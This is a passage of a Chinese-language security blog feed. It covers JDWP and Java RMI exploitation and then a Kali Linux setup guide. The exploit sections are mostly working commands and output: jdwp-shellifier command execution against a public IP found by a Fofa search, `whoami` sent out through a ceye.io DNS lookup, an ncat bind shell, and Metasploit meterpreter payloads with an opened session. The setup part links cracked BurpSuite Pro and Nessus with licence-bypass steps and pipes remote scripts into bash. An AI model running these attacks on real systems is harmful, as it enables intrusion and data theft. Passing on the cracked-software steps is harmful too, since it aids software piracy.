title="Fofa语法"></a>Fofa语法</h3><p>语法：banner=”jdwp”</p><p>120.197.8.190</p><p><img src="../images/jdwp-2.jpg" alt="jdwp-2"></p><h3 id="测试是否存在"><a href="#测试是否存在" class="headerlink" title="测试是否存在"></a>测试是否存在</h3><p>telnet/nc端口后，输入命令JDWP-Handshake<br>如果返回JDWP-Handshake，证明存在漏洞。</p><pre><code>&#123; echo &quot;JDWP-Handshake&quot;; sleep 20 &#125; | telnet 221.221.221.221 10010&#123; echo &quot;JDWP-Handshake&quot;; sleep 1 | trap exit INT&#125; | nc 221.221.221.221 10010</code></pre><h3 id="IOActive-jdwp-shellifier利用"><a href="#IOActive-jdwp-shellifier利用" class="headerlink" title="IOActive/jdwp-shellifier利用"></a><a href="https://github.com/IOActive/jdwp-shellifier">IOActive/jdwp-shellifier</a>利用</h3><ul><li>远程命令执行<br>本地执行python <a href="http://jdwp-shellifier.py/">jdwp-shellifier.py</a> -t 120.197.8.190 -p 8000 –break-on “java.lang.String.indexOf” <strong>–cmd “whoami”</strong></li></ul><pre><code> ./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;whoami&quot;[+] Targeting &#39;10.184.67.1:2005&#39;[+] Reading settings for &#39;Java HotSpot(TM) 64-Bit Server VM - 1.8.0_45&#39;[+] Found Runtime class: id=5456[+] Found Runtime.getRuntime(): id=7f9cb41916c0[+] Created break event id=2[+] Waiting for an event on &#39;java.lang.String.indexOf&#39;[+] Received matching event from thread 0x5542[+] Selected payload &#39;whoami&#39;[+] Command string object created id:5543[-] Unexpected returned type: expecting Object[!] Command successfully executed</code></pre><p>执行whoami，显示执行成功，但是没回显，无法探知。</p><ul><li>远程命令执行（回显）</li></ul><p>本地执行python <a href="http://jdwp-shellifier.py/">jdwp-shellifier.py</a> -t 120.197.8.190 -p 8000 –break-on “java.lang.String.indexOf” <strong>–cmd “ping `whoami`.<a href="https://link.zhihu.com/?target=http://ip.port.grqjsg.ceye.io">http://ip.port.grqjsg.ceye.io</a>“</strong></p><p>得到远程主机的用户名为：root</p><p><img src="../images/jdwp-3.jpg" alt="jdwp-3"></p><ul><li>反弹SHELL</li></ul><p>安装ncat</p><pre><code>./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;sudo yum install -y nc&quot;</code></pre><p>反弹shell</p><pre><code>./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on &quot;java.lang.String.indexOf&quot; --cmd  &quot;ncat -v -l -p 7777 -e /bin/bash&quot;</code></pre><p>连接shell</p><pre><code>nc 10.184.67.1 7777</code></pre><h3 id="Metasploit利用"><a href="#Metasploit利用" class="headerlink" title="Metasploit利用"></a>Metasploit利用</h3><p>用msfconsole启动Metasploit，并且选用exploit/multi/misc/java_jdwp_debugger漏洞利用模块。</p><pre><code>Module options (exploit/multi/misc/java_jdwp_debugger):   Name              Current Setting  Required  Description   ----              ---------------  --------  -----------   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response   RHOSTS            10.184.67.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT             2005             yes       The target port (TCP)   TMP_PATH                           no        A directory where we can write files. Ensure there is a trailing slashPayload options (linux/x64/meterpreter/bind_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LPORT  4444             yes       The listen port   RHOST  10.184.67.1      no        The target address</code></pre><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li> 关闭JDWP端口，或者JDWP端口不对公网开放</li><li> 关闭Java的debug模式（开启该模式对服务器性能有影响）</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI</title>
      <link href="Kali/Exploit/Java-RMI.html"/>
      <url>Kali/Exploit/Java-RMI.html</url>
      
        <content type="html"><![CDATA[<p><code>RMI (Java Remote Method Invocation) Java 远程方法调用</code>，是一种允许一个 JVM 上的 object 调用另一个 JVM 上 object 方法的机制。</p><p>RMI 程序通常包括</p><ul><li><code>rmi registry</code> naming service，提供 remote object 注册，name 到 remote object 的绑定和查询，是一种特殊的 remote object</li><li><code>rmi server</code> 创建 remote object，将其注册到 RMI registry</li><li><code>rmi client</code> 通过 name 向 RMI registry 获取 remote object reference (stub)，调用其方法</li></ul><p><img src="../images/java-rmi-1.gif" alt="java-rmi-1"></p><p>通常 RMI server 和 registry 运行在同一个 host 的不同端口上</p><blockquote><p>RMI Registry 默认运行在 1099 端口上</p><p>RMI URL <code>rmi://hostname:port/remoteObjectName</code></p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote><p>误报较高</p></blockquote><pre><code class="zsh">nmap -T4 -Pn -sV -p 11099,36753 --script rmi-vuln-classloader 10.200.19.52Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-26 17:47 CSTNmap scan report for 10.200.19.52Host is up (0.066s latency).PORT      STATE SERVICE  VERSION11099/tcp open  java-rmi Java RMI| rmi-vuln-classloader: |   VULNERABLE:|   RMI registry default configuration remote code execution vulnerability|     State: VULNERABLE|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.|       |     References:|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb36753/tcp open  java-rmi Java RMI| rmi-vuln-classloader: |   VULNERABLE:|   RMI registry default configuration remote code execution vulnerability|     State: VULNERABLE|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.|       |     References:|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rbService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds</code></pre><h2 id="Java-RMI接口枚举"><a href="#Java-RMI接口枚举" class="headerlink" title="Java RMI接口枚举"></a>Java RMI接口枚举</h2><pre><code class="zsh">msf6 auxiliary(gather/java_rmi_registry) &gt; show optionsModule options (auxiliary/gather/java_rmi_registry):   Name    Current Setting  Required  Description   ----    ---------------  --------  -----------   RHOSTS  10.200.19.52     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT   11099            yes       The target port (TCP)msf6 auxiliary(gather/java_rmi_registry) &gt; run[*] Running module against 10.200.19.52[*] 10.200.19.52:11099 - Sending RMI Header...[*] 10.200.19.52:11099 - Listing names in the Registry...[+] 10.200.19.52:11099 - 1 names found in the Registry[+] 10.200.19.52:11099 - Name jmxrmi (javax.management.remote.rmi.RMIServerImpl_Stub) found on 10.200.19.52:36753[*] Auxiliary module execution completed</code></pre><h2 id="Java-RMI代码执行扫描器"><a href="#Java-RMI代码执行扫描器" class="headerlink" title="Java RMI代码执行扫描器"></a>Java RMI代码执行扫描器</h2><pre><code class="zsh">msf6 auxiliary(scanner/misc/java_rmi_server) &gt; show optionsModule options (auxiliary/scanner/misc/java_rmi_server):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   RHOSTS   10.200.19.52     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT    11099            yes       The target port (TCP)   THREADS  1                yes       The number of concurrent threads (max one per host)msf6 auxiliary(scanner/misc/java_rmi_server) &gt; run[+] 10.200.19.52:11099    - 10.200.19.52:11099 Java RMI Endpoint Detected: Class Loader Enabled[*] 10.200.19.52:11099    - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><h2 id="Java-RMI默认配置导致的远程代码执行"><a href="#Java-RMI默认配置导致的远程代码执行" class="headerlink" title="Java RMI默认配置导致的远程代码执行"></a>Java RMI默认配置导致的远程代码执行</h2><pre><code class="zsh">msf6 exploit(multi/misc/java_rmi_server) &gt; show optionsModule options (exploit/multi/misc/java_rmi_server):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request   RHOSTS     192.168.79.28    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT      36753            yes       The target port (TCP)   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT    8080             yes       The local port to listen on.   SSL        false            no        Negotiate SSL for incoming connections   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)   URIPATH                     no        The URI to use for this exploit (default is random)Payload options (java/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  12.12.6.178      yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portmsf6 exploit(multi/misc/java_rmi_server) &gt; run[*] Started reverse TCP handler on 12.12.6.178:4444[*] 192.168.79.28:36753 - Using URL: http://0.0.0.0:8080/gXZLSG8BnMsa3B5[*] 192.168.79.28:36753 - Local IP: http://192.168.79.28:8080/gXZLSG8BnMsa3B5[*] 192.168.79.28:36753 - Server started.[-] 192.168.79.28:36753 - Exploit failed [unreachable]: RuntimeError The connection was refused by the remote host (192.168.79.28:36753).[*] 192.168.79.28:36753 - Server stopped.[*] Exploit completed, but no session was created.</code></pre><h2 id="Java-RMIConnectionImpl浏览器反序列化提权"><a href="#Java-RMIConnectionImpl浏览器反序列化提权" class="headerlink" title="Java RMIConnectionImpl浏览器反序列化提权"></a>Java RMIConnectionImpl浏览器反序列化提权</h2><pre><code>msf6 exploit(multi/misc/java_rmi_server) &gt; show optionsModule options (exploit/multi/misc/java_rmi_server):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request   RHOSTS     10.200.19.52     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT      11099            yes       The target port (TCP)   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT    8080             yes       The local port to listen on.   SSL        false            no        Negotiate SSL for incoming connections   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)   URIPATH                     no        The URI to use for this exploit (default is random)Payload options (java/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  12.12.6.178      yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portmsf6 exploit(multi/misc/java_rmi_server) &gt; run[*] Started reverse TCP handler on 12.12.6.178:4444[*] 10.200.19.52:11099 - Using URL: http://0.0.0.0:8080/oYpjH1vIBWgI4Ua[*] 10.200.19.52:11099 - Local IP: http://192.168.79.28:8080/oYpjH1vIBWgI4Ua[*] 10.200.19.52:11099 - Server started.[*] 10.200.19.52:11099 - Sending RMI Header...[*] 10.200.19.52:11099 - Sending RMI Call...[*] 10.200.19.52:11099 - Replied to request for payload JAR[*] Sending stage (53837 bytes) to 10.200.19.52[+] Meterpreter sessin 1 opened (192.168.79.28:4444 -&gt; 10.200.19.52:50836) at 2020-11-26 18:31:14 -0800</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali inux系统优化</title>
      <link href="Kali/kali-inux%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96.html"/>
      <url>Kali/kali-inux%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96.html</url>
      
        <content type="html"><![CDATA[<h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><pre><code class="zsh">sudo passwd rootecho &quot;$USER ALL=(ALL:ALL) NOPASSWD: ALL&quot; | sudo tee /etc/sudoers.d/dont-prompt-$USER-for-sudo-password  # 执行root权限的命令</code></pre><h3 id="更改区域设置"><a href="#更改区域设置" class="headerlink" title="更改区域设置"></a>更改区域设置</h3><pre><code class="zsh">sudo dpkg-reconfigure locales&gt; - en_US.UTF-8&gt; - zh_CN.UTF-8</code></pre><h3 id="输入法-amp-字体配置"><a href="#输入法-amp-字体配置" class="headerlink" title="输入法&amp;字体配置"></a>输入法&amp;字体配置</h3><pre><code class="zsh">wget https://ime.sogoucdn.com/dl/index/1605612770/sogoupinyin_2.4.0.2732_amd64.deb?st=dhRiak9ucl6k3GZibQ0Tfg&amp;e=1605918428&amp;fn=sogoupinyin_2.4.0.2732_amd64.deb   # 下载搜狗输入法软件包dpkg -i sougoupinyin.deb  #安装输入法dpkg --configure -a  #软件包更新中断时的修复命令dpkg -r sogoupinyin   # 删除软件dpkg -P sougoupinyin  # 删除软件及配置文件apt install zsh-theme-powerlevel9k # 安装zsh-theme-powerlevel9k字体</code></pre><h3 id="升级系统"><a href="#升级系统" class="headerlink" title="升级系统"></a>升级系统</h3><pre><code class="zsh">echo &quot;#deb http://http.kali.org/kali kali-rolling main non-free contribdeb http://mirrors.aliyum.com/kali kali-rolling main non-free contribdeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib&quot; | tee /etc/apt/sources.list   #配置阿里和中科大源apt update &amp;&amp; apt upgrade -y  # 升级软件列表并更新软件 \&amp;&amp;apt dist-upgrade -y  # 升级系统 \&amp;&amp;apt clean &amp;&amp; apt autoclean &amp;&amp; apt autoremove -y # 清除 已下载的软件包 和 旧软件包dpkg -l |grep ^rc|awk &#39;&#123;print $2&#125;&#39; |sudo xargs dpkg -P   # 清理系统残存配置</code></pre><p>常见清理命令理解</p><ul><li>apt remove/autoremove 卸载软件</li><li>apt clean/autoclean   删除软件包<table><thead><tr><th align="left">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="left"><code>apt purge </code></td><td align="center">删除软件,删除配置信息</td></tr><tr><td align="left"><code>apt remove </code></td><td align="center">删除软件(保留配置信息)</td></tr><tr><td align="left"><code>apt autoremove</code></td><td align="center">删除为了满足其他软件包的依赖而安装，但现在不再需要的软件包</td></tr><tr><td align="left"><code>apt autoclean</code></td><td align="center">删除未安装在系统的软件包</td></tr><tr><td align="left"><code>apt clean</code></td><td align="center">删除已安装的软件包(/var/cache/apt/archives内的软件包</td></tr><tr><td align="left">apt install –fix-broken /-f</td><td align="center">dpkg安装失败时修复依赖关系</td></tr></tbody></table></li></ul><h3 id="安装-清理内核头文件"><a href="#安装-清理内核头文件" class="headerlink" title="安装/清理内核头文件"></a>安装/清理内核头文件</h3><pre><code>apt install linux-headers-$(uname -r)   dpkg --get-selections | grep linux   apt purge &lt;kernel-name&gt;  &lt;haders-name&gt;</code></pre><h3 id="UI优化"><a href="#UI优化" class="headerlink" title="UI优化"></a>UI优化</h3><ul><li><p>主题文件：/usr/share/themes/</p></li><li><p>图标文件：/usr/share/icons/</p></li><li><p>背景壁纸：/usr/share/background/ </p></li><li><p>grub启动图片： /usr/share/images/desktop-bas</p><ul><li>login-background.png #进如系统界面的背景图  </li><li>kali-grub.png　　　　　#grub的背景图片  </li><li>kali-wallpaper_1024×786 #类似的都是桌面背景图</li></ul></li><li><p>、/usr/share/wallpapers/</p></li><li><p>conky: /etc/conky/</p></li></ul><h3 id="终端优化"><a href="#终端优化" class="headerlink" title="终端优化"></a>终端优化</h3><ol><li><p>zsh优化</p><pre><code class="zsh">#oh-my-zshsh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;  # 安装oh-my-zshsed -i &#39;s/robbyrussell/gnzh/g&#39;  .zshrc  # 替换主题git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions  # 下载zsh-autosuggestions插件git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting  # 下载syntax-highling插件git clone https://github.com/zsh-users/zsh-completions $&#123;ZSH_CUSTOM:=~/.oh-my-zsh/custom&#125;/plugins/zsh-completions   # 下载zsh-completionssed -i &quot;s/plugins.*/plugins=(git web-search autojump zsh-autosuggestions zsh-syntax-highlighting zsh-completions )/g&quot; .zshrc  # 配置插件apt install autojump  # 安装autojumpcurl -fsSL https://starship.rs/install.sh | bash #下载prompt-starshipecho &quot;ZXZhbCAiJChzdGFyc2hpcCBpbml0IGJhc2gpIgo=&quot; | base64 -d &gt;&gt;~/.zshrc    # 添加eval &quot;$(starship init bash)&quot;  到.zshrcrm &quot;$(which starship)&quot;  # Locate and delete the starship binary#opt: zsh欢迎语echo &quot;CiMgenNoIHdlbGNvbWUgYmFubmVyIQpmaWdsZXQgImFza0RpbmciCmVjaG8gLW5lICJUb2RheSBpczpcdFx0JHtyZWR9IiBgZGF0ZWAgO2VjaG8gIiIgI2Rpc3BsYXkgY3VycmVudCB0aW1lCmVjaG8gLW5lICIke2xpZ2h0Z3JlZW59S2VybmVsIEluZm9ybWF0aW9uOiBcdCR7cmVkfSIgYHVuYW1lIC1zbXJgICNkaXNwbGF5IHN5c3RlbSBpbmZvcm1hdGlvbgoK&quot;| base64 -d  &gt;&gt; .zshrc &amp;&amp; source .zshrc  # 设置zsh欢迎语并立即生效</code></pre></li><li><p>vim/neovim优化</p><pre><code class="zsh">curl -sLf https://spacevim.org/install.sh | bash  </code></pre></li><li><p>tmux优化</p><pre><code class="zsh">git clone https://github.com/gpakosz/.tmux.git ~/.tmux &amp;&amp;\ln -s -f .tmux/.tmux.conf  &amp;&amp;\cp .tmux/.tmux.conf.local .   # tmux</code></pre></li><li><p>eDux-ui终端</p><blockquote><p><a href="https://github.com/GitSquared/edex-ui">https://github.com/GitSquared/edex-ui</a></p></blockquote></li></ol><h3 id="其他优化"><a href="#其他优化" class="headerlink" title="其他优化"></a>其他优化</h3><h4 id="永久开启IP转发功能"><a href="#永久开启IP转发功能" class="headerlink" title="永久开启IP转发功能"></a>永久开启IP转发功能</h4><pre><code class="zsh">echo &quot;net.ipv4.ip_forward=1&quot;  &gt;&gt; /etc/sysctl.confecho 1 &gt; /proc/sys/net/ipv6/conf/all/forwarding</code></pre><h4 id="右键文件编码转换"><a href="#右键文件编码转换" class="headerlink" title="右键文件编码转换"></a>右键文件编码转换</h4><h2 id="系统服务配置"><a href="#系统服务配置" class="headerlink" title="系统服务配置"></a>系统服务配置</h2><h3 id="PostgreSQL服务"><a href="#PostgreSQL服务" class="headerlink" title="PostgreSQL服务"></a>PostgreSQL服务</h3><pre><code class="zsh">systemctl start postgresql.servicesystemctl enable postgresql</code></pre><h3 id="设置-SSH-通过密钥登录"><a href="#设置-SSH-通过密钥登录" class="headerlink" title="设置 SSH 通过密钥登录"></a>设置 SSH 通过密钥登录</h3><p>分为服务器<code>sshd文件配置</code>和<code>本地客户端配置</code></p><h4 id="lt-1-gt-VPS上sshd配置"><a href="#lt-1-gt-VPS上sshd配置" class="headerlink" title="&lt;1&gt;VPS上sshd配置"></a>&lt;1&gt;VPS上sshd配置</h4><ol><li>在vps上生成rsa密钥,并为私钥添加passphrase,</li></ol><pre><code class="zsh">[root@～]# ssh-keygen -t rsa        #生成rsa密钥Generating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa): Created directory &#39;/root/.ssh&#39;.Enter passphrase (empty for no passphrase):      #设置密钥短语Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsaYour public key has been saved in /root/.ssh/id_rsa.pubThe key fingerprint is:SHA256:9k3RJ8EpR63FIK5PSkCdujrIoP1gmkokxcDuCfV+eoI root@kaliThe key&#39;s randomart image is:+---[RSA 3072]----+|o       .. ..o+= || +.    .  o..o+.+||..o.    ..  oooo.||.o  .   .. . ..o ||+...    S.o o    ||oo. . ...o *     || +o+ + .  o o    ||o+E.= +          ||=  ..o .         |+----[SHA256]-----+</code></pre><ol start="2"><li><p>把公钥文件写入到<code> ~/.ssh/authorized_keys</code></p><pre><code class="zsh">[root@～]# cat .ssh/id_rsa.pub &gt;&gt; .ssh/authorized_keys     #添加公钥到授权文件</code></pre></li><li><p>更改.ssh目录及文件权限</p><pre><code class="zsh">[root@local]# chmod 700 .ssh  &amp;&amp;\           chmod 600 .ssh/id_rsa.pub  .ssh/authorized_keys &amp;&amp;\           chmod 400 .ssh/id_rsa #设置.ssh目录权限</code></pre></li><li><p>修改<code>/etc/ssh/sshd_config</code>文件</p><pre><code class="zsh">sed -i &quot;s/#Port.*/Port 2020/g&quot; /etc/ssh/sshd_config  #修改端口为2020</code></pre></li></ol><p>sed -i “s/#PermitRootLogin.*/PermitRootLogin yes/g” /etc/ssh/sshd_config   #允许root登陆</p><p>sed -i “38a\RSAAuthentication yes” /etc/ssh/sshd_config   #使用RSA认证</p><p>sed -i “s/^#AuthorizedKeysFile.*/AuthorizedKeysFile .ssh/authorized_keys/g” /etc/ssh/sshd_config  #启用authorized_keys文件</p><p>sed -i “s/^PasswordAuthentication.*/PasswordAuthentication no/g” /etc/ssh/sshd_config    #关闭密码认证</p><p>可选:建立隧道<br>sed -i “s/#AllowTcpForwarding yes/AllowTcpForwarding yes/g” /etc/ssh/sshd_config  #启用tcp转发</p><p>sed -i “s/#TCPKeepAlive yes/TCPKeepAlive yes/g”  /etc/ssh/sshd_config   #防止死连接</p><pre><code>5. 设置开机自启动服务```zsh[root@～]# systemctl restart ssh &amp;&amp; systemctl enable ssh</code></pre><h4 id="lt-2-gt-本地配置"><a href="#lt-2-gt-本地配置" class="headerlink" title="&lt;2&gt;本地配置"></a>&lt;2&gt;本地配置</h4><p>拷贝私钥到本地电脑为id_rsa.vps</p><pre><code class="zsh">[root@～]# ssh -i .ssh/id_rsa.vps root@172.16.41.4 -p 2020</code></pre><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><h3 id="渗透测试软件"><a href="#渗透测试软件" class="headerlink" title="渗透测试软件"></a>渗透测试软件</h3><h4 id="BurpSuite-Professional"><a href="#BurpSuite-Professional" class="headerlink" title="[BurpSuite Professional]"></a>[BurpSuite Professional]</h4><blockquote><p><a href="https://pan.baidu.com/s/1klNoVJdPxVdanAbiJBT4kg">https://pan.baidu.com/s/1klNoVJdPxVdanAbiJBT4kg</a>  密码: mpnk</p></blockquote><blockquote><p>Project options &gt; Misc &gt; Embedded Browser</p></blockquote><pre><code class="zsh">apt purge burpsuite  # 清除系统自带社区版apt-mark hold burpsuite  # 禁止burpsuite自动安装/升级/卸载echo &quot;W0Rlc2t0b3AgRW50cnldCk5hbWU9QnVycFN1aXRlIFByb2Zlc3Npb25hbApFbmNvZGluZz1VVEYtOApFeGVjPSBzaCAtYyAiY2QgL29wdC9idXJwc3VpdGVfcHJvOyBqYXZhIC1qYXIgL29wdC9idXJwc3VpdGVfcHJvL0J1cnBTdWl0ZUxvYWRlci5qYXIiCkljb249a2FsaS1idXJwc3VpdGUKU3RhcnR1cE5vdGlmeT1mYWxzZQpUZXJtaW5hbD1mYWxzZQpUeXBlPUFwcGxpY2F0aW9uCkNhdGVnb3JpZXM9MDMtd2ViYXBwLWFuYWx5c2lzOzAzLTA2LXdlYi1hcHBsaWNhdGlvbi1wcm94aWVzOwpYLUthbGktUGFja2FnZT1idXJwc3VpdGU=&quot; | base64 -d | tee /usr/share/applications/kali-burpsuite.desktop  # 配置BurpSuite启动器链接，启动路径为Exec= sh -c &quot;cd /opt/burpsuite_pro; java -jar /opt/burpsuite_pro/BurpSuiteLoader.jari&quot;chattr +i /usr/share/applications/kali-burpsuite.desktop  # 防止升级时被删除或修改</code></pre><h4 id="Nessus-Professional"><a href="#Nessus-Professional" class="headerlink" title="[Nessus Professional]"></a>[Nessus Professional]</h4><blockquote><p>链接: <a href="https://pan.baidu.com/s/1RkXQE5XkeBGHlgWK42pArA">https://pan.baidu.com/s/1RkXQE5XkeBGHlgWK42pArA</a>  密码: c07r</p></blockquote><ul><li>安装<pre><code class="zsh">dpkg -i Nessus-8.12.1-debian6_amd64.deb   # 安装Nessus软件systemctl start nessusd.service  # 启动nessud服务</code></pre></li><li>访问<a href="https://localhost:8834/">https://localhost:8834/</a>  </li><li>选择 <code>Managed Scanner</code> 然后 <code>tenable.SC</code> 最后创建 <code>user with password</code> 并登陆</li><li>升级插件库并替换<code>plugin_feed_info.inc</code>文件<pre><code class="zsh">systemctl stop nessusd.service  # 关闭nessud服务/opt/nessus/sbin/nessuscli update /root/Desktop/all-2.0.tar.gz  # 升级插件库</code></pre></li></ul><p>cp /root/Desktop/plugin_feed_info.inc  /opt/nessus/var/nessus/plugin_feed_info.inc  # 替换plugin_feed_info.inc<br>cp /root/Desktop/plugin_feed_info.inc  /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc   # 替换plugin_feed_info.inc</p><p>systemctl start nessusd.service  # 启动nessud服务</p><pre><code>### 常用软件#### 码字神器Typora```zsh# sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAEwget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add -# add Typora&#39;s repositorysudo add-apt-repository &#39;deb https://typora.io/linux ./&#39;sudo apt-get update# install typorasudo apt-get install typora</code></pre><h4 id="码字神器Joplin"><a href="#码字神器Joplin" class="headerlink" title="码字神器Joplin"></a>码字神器Joplin</h4><pre><code class="zsh">apt install joplin /joplin-cli</code></pre><p>或者</p><pre><code class="zsh">apt install nodejs npmnpm config set registry https://registry.npm.taobao.orgecho  -e &quot;\n#Jopling configure\nNPM_CONFIG_PREFIX=~/.joplin-bin\n&quot; &gt;&gt; ~/.zshrcnpm install -g joplinln -s ~/.joplin-bin/bin/joplin /usr/bin/joplin</code></pre><h4 id="办公神器WPS"><a href="#办公神器WPS" class="headerlink" title="办公神器WPS"></a>办公神器WPS</h4><pre><code class="zsh">wget https://wdl1.cache.wps.cn/wps/download/ep/Linux2019/9719/wps-office_11.1.0.9719_amd64.deb  # 下载wps-office软件dpkg -i wps-office_11.1.0.9719_amd64.deb </code></pre><h4 id="代码差异分析神器diff-so-fancy"><a href="#代码差异分析神器diff-so-fancy" class="headerlink" title="代码差异分析神器diff-so-fancy"></a>代码差异分析神器diff-so-fancy</h4><pre><code class="zsh">git clone https://github.com/so-fancy/diff-so-fancy.git</code></pre><h4 id="远程连接神器Remmina"><a href="#远程连接神器Remmina" class="headerlink" title="远程连接神器Remmina"></a>远程连接神器Remmina</h4><pre><code class="zsh">apt  install remmina</code></pre><h4 id="代理Proxy软件v2rayL"><a href="#代理Proxy软件v2rayL" class="headerlink" title="代理Proxy软件v2rayL"></a>代理Proxy软件v2rayL</h4><ul><li>v2aryL<pre><code class="zsh">bash &lt;(curl -s -L http://dl.thinker.ink/install.sh)</code></pre></li><li>clash<blockquote><p><a href="https://github.com/Dreamacro/clash/releases">https://github.com/Dreamacro/clash/releases</a></p></blockquote><pre><code class="zsh">tar -zxvf clash-linux-amd64-v1.3.0.gzmv clash-linux-amd64-v1.3.0 /usr/local/bin/clashchmod +x /usr/local/bin/clash</code></pre></li></ul><h4 id="文件互传神器croc"><a href="#文件互传神器croc" class="headerlink" title="文件互传神器croc"></a>文件互传神器<a href="https://github.com/mingrammer/diagrams">croc</a></h4><pre><code class="zsh">curl https://getcroc.schollz.com | bash</code></pre><h4 id="图形化hex编辑器"><a href="#图形化hex编辑器" class="headerlink" title="图形化hex编辑器"></a>图形化hex编辑器</h4><pre><code class="zsh">apt install bless</code></pre><h4 id="系统优化-amp-监视器"><a href="#系统优化-amp-监视器" class="headerlink" title="系统优化&amp;监视器"></a>系统优化&amp;监视器</h4><ul><li>stacer<pre><code class="zsh">apt install stacer</code></pre></li><li>bashtop<pre><code class="zsh">git clone https://github.com/aristocratos/bashtop.git &amp;&amp;\cd bashtop  &amp;&amp; \sudo make install</code></pre></li></ul><h4 id="Gif录屏工具peek"><a href="#Gif录屏工具peek" class="headerlink" title="Gif录屏工具peek"></a>Gif录屏工具peek</h4><pre><code class="zsh">apt install peek</code></pre><h2 id="自动化配置脚本-后续整理"><a href="#自动化配置脚本-后续整理" class="headerlink" title="自动化配置脚本-后续整理"></a>自动化配置脚本-后续整理</h2><pre><code class="zsh">echo &quot;&quot;echo &quot;==========================================================================&quot;echo &quot;=               Kali Auto Init Tool                                      =&quot;echo &quot;=                      Powered by Mr.Framework                               =&quot;echo &quot;=                      https://askding.github.io                        =&quot;echo &quot;==========================================================================&quot;echo &quot;&quot;echo &quot;[*] 即将自动对kali进行基本配置，建议你根据需要修改脚本。安装配置过程可能需要一会儿，并且由你的网速决定....&quot;read -p &quot;[*] 请按任意键继续....&quot;echo &quot;[+] 添加kali源&quot;apt-key adv --recv 